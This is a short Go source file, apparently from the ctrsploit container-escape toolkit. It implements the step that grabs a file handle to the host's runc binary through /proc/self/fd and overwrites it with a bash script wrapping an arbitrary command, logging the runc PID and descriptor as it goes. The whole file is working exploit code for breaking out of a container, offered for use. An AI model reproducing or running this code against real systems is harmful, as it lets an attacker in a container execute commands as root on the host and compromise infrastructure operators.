package pipeprimitive

import (
	"fmt"
	"time"

	"github.com/ctrsploit/ctrsploit/pkg/pipe-primitive/runcwatch"
	"github.com/ctrsploit/sploit-spec/pkg/log"
)

func ShellPayload(cmd string) []byte {
	return []byte(fmt.Sprintf("#!/bin/bash\n%s\n", cmd))
}

func OverwriteRunc(primitive Primitive, payload []byte, timeout time.Duration) error {
	handle, err := captureRunCHandle(timeout)
	if err != nil {
		return err
	}
	defer handle.Close()
	log.Logger.Infof("Found the runc PID: %d", handle.PID)
	log.Logger.Infof("Found the runc cmdline: %q", handle.Cmdline)
	log.Logger.Infof("Found the runc exe: %s", handle.Exe)
	log.Logger.Infof("Successfully got runc file handle: %d", handle.FD)

	path := fmt.Sprintf("/proc/self/fd/%d", handle.FD)
	if err := WriteImage(primitive, path, payload); err != nil {
		return fmt.Errorf("overwrite runc through %s: %w", path, err)
	}
	log.Logger.Infof("The runc has been overwritten as:\n%s\n", payload)
	return nil
}

func captureRunCHandle(timeout time.Duration) (runcwatch.Handle, error) {
	return runcwatch.CaptureHandle(timeout, runcwatch.OpenProcExeFile)
}

func isRunCCmdline(cmdline string) bool {
	return runcwatch.IsRunCCmdline(cmdline)
}
